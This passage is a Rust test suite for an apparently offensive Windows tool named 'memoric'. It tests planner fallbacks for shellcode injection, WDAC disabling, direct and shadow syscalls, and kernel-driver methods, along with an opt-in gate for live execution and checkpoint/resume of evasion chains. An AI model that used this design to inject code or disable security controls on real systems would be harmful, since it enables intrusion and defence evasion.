                    .contains(&json!("driver_unavailable"))));
    }

    #[test]
    fn live_planner_selection_applies_same_tool_action_fallback_to_dispatch_args() {
        let capabilities = json!({
            "platform": { "supported": true, "message": "Windows runtime detected" },
            "privilege": {
                "elevated": true,
                "debug": { "enabled": true }
            },
            "driver": {
                "readiness": {
                    "kernel_actions_ready": false,
                    "driver_load_possible": false
                },
                "message": "driver unavailable in test matrix"
            }
        });
        let mut step_args = json!({
            "pid": 1234,
            "action": "shellcode",
            "method": "kernel_driver_apc"
        });
        let mut decision = planner_decision("inject", "shellcode", &step_args, &capabilities);

        assert_eq!(decision["selection"]["status"], "fallback_recommended");
        assert_eq!(decision["selection"]["selected"]["method"], "thread");

        apply_live_planner_selection("inject", "shellcode", &mut step_args, &mut decision)
            .expect("same tool/action registry fallback should be applied");

        assert_eq!(step_args["method"], "thread");
        assert_eq!(decision["selection"]["applies_to_dispatch"], true);
        assert_eq!(
            decision["selection"]["dispatch_application"]["applied"],
            true
        );
        assert_eq!(
            decision["selection"]["dispatch_application"]["original_requested"],
            "kernel_driver_apc"
        );
    }

    #[test]
    fn live_planner_selection_blocks_cross_tool_action_fallbacks() {
        let mut step_args = json!({
            "pid": 1234,
            "action": "shellcode",
            "method": "driver_backed"
        });
        let mut planner = json!({
            "include_in_effective_plan": true,
            "selection": {
                "kind": "injection_method",
                "status": "fallback_recommended",
                "parameter": "method",
                "requested": "driver_backed",
                "selected": {
                    "tool": "kernel",
                    "action": "driver_apc_inject",
                    "method": "kernel_driver_apc",
                    "available": true
                },
                "applies_to_dispatch": false,
                "candidates": []
            }
        });

        let error =
            apply_live_planner_selection("inject", "shellcode", &mut step_args, &mut planner)
                .expect_err("cross tool/action fallback must be blocked");

        assert!(error.contains("cannot safely rewrite across tool/action boundaries"));
        assert_eq!(step_args["method"], "driver_backed");
        assert_eq!(planner["selection"]["applies_to_dispatch"], false);
        assert_eq!(
            planner["selection"]["dispatch_application"]["requires_cross_tool_action_mapping"],
            true
        );
    }

    #[test]
    fn live_planner_selection_applies_stealth_policy_method_fallback() {
        let capabilities = json!({
            "platform": { "supported": true, "message": "Windows runtime detected" },
            "privilege": {
                "elevated": true,
                "debug": { "enabled": true }
            },
            "driver": {
                "readiness": {
                    "kernel_actions_ready": false,
                    "driver_load_possible": false
                },
                "message": "driver unavailable in test matrix"
            }
        });
        let mut step_args = json!({
            "action": "wdac_disable",
            "method": "driver_ci"
        });
        let mut decision = planner_decision("stealth", "wdac_disable", &step_args, &capabilities);

        assert_eq!(decision["selection"]["kind"], "stealth_policy_method");
        assert_eq!(decision["selection"]["status"], "fallback_recommended");
        assert_eq!(decision["selection"]["selected"]["method"], "registry");

        apply_live_planner_selection("stealth", "wdac_disable", &mut step_args, &mut decision)
            .expect("same stealth action policy fallback should be applied");

        assert_eq!(step_args["method"], "registry");
        assert_eq!(decision["selection"]["applies_to_dispatch"], true);
        assert_eq!(
            decision["selection"]["dispatch_application"]["original_requested"],
            "driver_ci"
        );
    }

    #[test]
    fn live_planner_selection_applies_stealth_syscall_method_fallback() {
        let capabilities = json!({
            "platform": { "supported": true, "message": "Windows runtime detected" },
            "privilege": {
                "elevated": true,
                "debug": { "enabled": true }
            },
            "driver": {
                "readiness": {
                    "kernel_actions_ready": false,
                    "driver_load_possible": false
                },
                "message": "driver unavailable in test matrix"
            }
        });
        let mut step_args = json!({
            "action": "syscall_write",
            "syscall_method": "shadow_stub"
        });
        let mut decision = planner_decision("stealth", "syscall_write", &step_args, &capabilities);

        assert_eq!(decision["selection"]["kind"], "stealth_syscall_method");
        assert_eq!(decision["selection"]["status"], "fallback_recommended");
        assert_eq!(decision["selection"]["selected"]["method"], "direct");

        apply_live_planner_selection("stealth", "syscall_write", &mut step_args, &mut decision)
            .expect("same stealth syscall fallback should be applied");

        assert_eq!(step_args["syscall_method"], "direct");
        assert_eq!(decision["selection"]["applies_to_dispatch"], true);
        assert_eq!(
            decision["selection"]["dispatch_application"]["original_requested"],
            "shadow_stub"
        );
    }

    #[test]
    fn planner_marks_kernel_backed_stealth_policy_methods_when_driver_ready() {
        let capabilities = json!({
            "platform": { "supported": true, "message": "Windows runtime detected" },
            "privilege": {
                "elevated": true,
                "debug": { "enabled": true }
            },
            "driver": {
                "readiness": {
                    "kernel_actions_ready": true,
                    "driver_load_possible": true
                },
                "message": "memoric.sys device is reachable"
            }
        });

        let decision = planner_decision("stealth", "wdac_disable", &json!({}), &capabilities);

        assert_eq!(decision["selection"]["kind"], "stealth_policy_method");
        assert_eq!(decision["selection"]["selected"]["method"], "driver_ci");
        assert_eq!(
            decision["selection"]["selected"]["evidence"]["requires_driver"],
            true
        );
    }

    #[test]
    fn assess_environment_returns_machine_readable_evidence() {
        let result = assess_environment(&json!({})).expect("assessment should complete");

        assert_eq!(result["success"], true);
        assert_eq!(result["technique"], "environment_assessment");
        assert_eq!(
            result["evidence"]["schema"],
            "memoric.assessment.evidence.v1"
        );

        let properties = result["evidence"]["environment_properties"]
            .as_array()
            .expect("environment properties");
        let platform = properties
            .iter()
            .find(|entry| entry["subject"] == "platform")
            .expect("platform evidence");
        assert_eq!(platform["method"], "capability_matrix");
        assert!(platform["confidence"].as_f64().is_some());
        assert!(platform["timestamp"].as_str().is_some());
        assert!(platform["raw_evidence_summary"].is_object());

        let inputs = result["evidence"]["assessment_inputs"]
            .as_array()
            .expect("assessment inputs");
        assert!(inputs.iter().any(|entry| entry["subject"] == "threat_level"
            && entry["method"] == "rule_based_classification"));
    }

    #[test]
    fn execute_chain_live_mode_requires_explicit_opt_in_before_assessment() {
        let err = execute_chain(&json!({
            "pid": 1234,
            "dry_run": false
        }))
        .expect_err("live execution without opt-in must stop before assessment");

        assert!(err.to_string().contains("allow_live_execution=true"));
    }

    #[test]
    fn execute_chain_live_mode_uses_capability_planner_before_dispatch() {
        let _guard = crate::state::TEST_ENV_LOCK.lock().unwrap();
        let _policy = isolate_policy_env();
        let result = execute_chain(&json!({
            "pid": 1234,
            "dry_run": false,
            "allow_live_execution": true
        }))
        .expect(
            "live execution should report planner-blocked required step instead of dispatching",
        );

        assert_eq!(result["success"], false);
        assert_eq!(result["steps_executed"], 0);
        assert_eq!(result["steps_failed"], 1);
        assert!(result["live_planner"].is_object());

        let failure = result["failures"][0].clone();
        assert_eq!(failure["skipped"], true);
        assert_eq!(failure["planner"]["include_in_effective_plan"], false);
        assert!(failure["message"]
            .as_str()
            .unwrap_or_default()
            .contains("live capability-aware planner"));
    }

    #[test]
    fn chain_state_checkpoint_persists_step_progress_without_raw_payloads() {
        let path = std::env::temp_dir().join(format!(
            "memoric-chain-state-{}-{}.json",
            std::process::id(),
            "checkpoint"
        ));
        let _ = std::fs::remove_file(&path);

        let dag = json!({"execution_order": ["stage", "run"]});
        let plan = vec![
            json!({
                "id": "stage",
                "tool": "memory",
                "action": "write",
                "required": true,
                "depends_on": [],
                "args": {
                    "pid": 1234,
                    "address": "0x1000",
                    "bytes": [1, 2, 3, 4]
                }
            }),
            json!({
                "id": "run",
                "tool": "inject",
                "action": "shellcode",
                "required": true,
                "depends_on": ["stage"],
                "args": {
                    "pid": 1234,
                    "shellcode": "90 C3"
                }
            }),
        ];
        let mut chain = create_chain_state(
            "chain-test-checkpoint",
            &json!({"task_id": "task-chain"}),
            1234,
            "Low",
            &plan,
            &dag,
        );
        assert_eq!(chain.next_step.as_deref(), Some("stage"));
        assert_eq!(
            chain.steps[0].args_summary["bytes"]["redacted"], true,
            "byte payload should not be persisted"
        );

        mark_chain_step_running(&mut chain, "stage");
        mark_chain_step_completed(
            &mut chain,
            "stage",
            &json!({
                "success": true,
                "message": "write complete",
                "bytes": [9, 9, 9],
                "rollback": {
                    "action": {
                        "tool": "memory",
                        "action": "write",
                        "args": {"bytes": [1, 2, 3, 4]}
                    }
                }
            }),
        );
        assert_eq!(chain.completed_steps, 1);
        assert_eq!(chain.last_completed_step.as_deref(), Some("stage"));
        assert_eq!(chain.next_step.as_deref(), Some("run"));
        assert_eq!(
            chain.steps[0].result_summary.as_ref().unwrap()["rollback"]["action"]["args"]["bytes"]
                ["redacted"],
            true
        );

        persist_chain_state_to_path(&path, &chain).expect("persist chain");
        let loaded = load_chain_state_file_from_path(&path).expect("load chain");
        assert_eq!(loaded.chains.len(), 1);
        assert_eq!(loaded.chains[0].chain_id, "chain-test-checkpoint");
        assert_eq!(
            loaded.chains[0].last_completed_step.as_deref(),
            Some("stage")
        );
        assert_eq!(loaded.chains[0].next_step.as_deref(), Some("run"));
        assert_eq!(
            loaded.chains[0].resume["resume_available"], true,
            "checkpoint should expose resume metadata"
        );

        let content = std::fs::read_to_string(&path).expect("chain state file");
        assert!(!content.contains("90 C3"));
        assert!(!content.contains("[1,2,3,4]"));

        let _ = std::fs::remove_file(path);
    }

    #[test]
    fn persisted_chain_state_supports_status_resume_cancel_and_cleanup_by_chain_id() {
        let _guard = crate::state::TEST_ENV_LOCK.lock().unwrap();
        let path = std::env::temp_dir().join(format!(
            "memoric-chain-state-{}-lifecycle.json",
            std::process::id()
        ));
        let _ = std::fs::remove_file(&path);
        let _env = set_env(CHAIN_STATE_PATH_ENV, &path.display().to_string());

        let plan = vec![json!({
            "id": "stage",
            "tool": "memory",
            "action": "write",
            "required": true,
            "depends_on": [],
            "args": {
                "pid": 1234,
                "address": "0x1000",
                "bytes": [1, 2, 3, 4]
            }
        })];
        let mut chain = create_chain_state(
            "chain-test-lifecycle",
            &json!({"task_id": "task-chain"}),
            1234,
            "Low",
            &plan,
            &json!({"execution_order": ["stage"]}),
        );
        mark_chain_step_running(&mut chain, "stage");
        persist_chain_state_to_path(&path, &chain).expect("persist chain");

        let status =
            chain_status(&json!({"chain_id": "chain-test-lifecycle"})).expect("chain status");
        assert_eq!(status["success"], true);
        assert_eq!(status["chain_id"], "chain-test-lifecycle");
        assert_eq!(status["next_step"], "stage");
        assert_eq!(
            status["steps"][0]["args_summary"]["bytes"]["redacted"],
            true
        );

        let resume =
            resume_chain(&json!({"chain_id": "chain-test-lifecycle"})).expect("resume preview");
        assert_eq!(resume["success"], true);
        assert_eq!(resume["executes_live_actions"], false);
        assert_eq!(resume["resume_available"], true);

        let cancelled =
            cancel_chain(&json!({"chain_id": "chain-test-lifecycle"})).expect("cancel chain");
        assert_eq!(cancelled["success"], true);
        assert_eq!(cancelled["status"], "cancelled");

        let cleanup_preview =
            cleanup_chain(&json!({"chain_id": "chain-test-lifecycle"})).expect("cleanup preview");
        assert_eq!(cleanup_preview["dry_run"], true);
        assert_eq!(cleanup_preview["removed_count"], 0);

        let cleanup = cleanup_chain(&json!({
            "chain_id": "chain-test-lifecycle",
            "dry_run": false
        }))
        .expect("cleanup chain");
        assert_eq!(cleanup["success"], true);
        assert_eq!(cleanup["removed_count"], 1);
        assert!(chain_status(&json!({"chain_id": "chain-test-lifecycle"})).is_err());

        let loaded = load_chain_state_file_from_path(&path).expect("load state");
        assert!(loaded.chains.is_empty());

        let _ = std::fs::remove_file(path);
    }

    #[test]
    fn execute_chain_with_checkpoint_skips_completed_steps_without_replaying_live_actions() {
        let _guard = crate::state::TEST_ENV_LOCK.lock().unwrap();
        let _policy = isolate_policy_env();
        let path = std::env::temp_dir().join(format!(
            "memoric-chain-state-{}-execute-resume.json",
            std::process::id()
        ));
        let _ = std::fs::remove_file(&path);
        let _env = set_env(CHAIN_STATE_PATH_ENV, &path.display().to_string());

        let args = json!({
            "pid": std::process::id(),
            "dry_run": false,
            "allow_live_execution": true,
            "task_id": "task-chain-resume"
        });
        let assessment = assess_environment(&args).expect("assessment");
        let threat_level = assessment["threat_level"].as_str().unwrap_or("Low");
        let plan = assessment["evasion_plan"]
            .as_array()
            .cloned()
            .expect("assessment plan");
        let dag = orchestration_dag_preview(&plan);
        let mut chain = create_chain_state(
            "chain-test-execute-resume",
            &args,
            std::process::id(),
            threat_level,
            &plan,
            &dag,
        );
        for (index, step) in plan.iter().enumerate() {
            let step_id = orchestration_step_id(step, index + 1);
            mark_chain_step_completed(
                &mut chain,
                &step_id,
                &json!({
                    "success": true,
                    "message": "completed before resume"
                }),
            );
        }
        persist_chain_state_to_path(&path, &chain).expect("persist completed checkpoint");

        let resumed = execute_chain(&json!({
            "pid": std::process::id(),
            "dry_run": false,
            "allow_live_execution": true,
            "chain_id": "chain-test-execute-resume",
            "skip_completed_steps": true,
            "task_id": "task-chain-resume"
        }))
        .expect("resume execute should skip checkpoint-completed steps");

        assert_eq!(resumed["success"], true);
        assert_eq!(resumed["chain_id"], "chain-test-execute-resume");
        assert_eq!(resumed["steps_executed"], 0);
        assert_eq!(resumed["steps_skipped_from_checkpoint"], plan.len());
        assert!(resumed["results"]
            .as_array()
            .unwrap()
            .iter()
            .all(|entry| entry["skipped"] == true && entry["resume_checkpoint"] == true));
        assert_eq!(resumed["checkpoint"]["status"], "completed");

        let _ = std::fs::remove_file(path);
    }
}
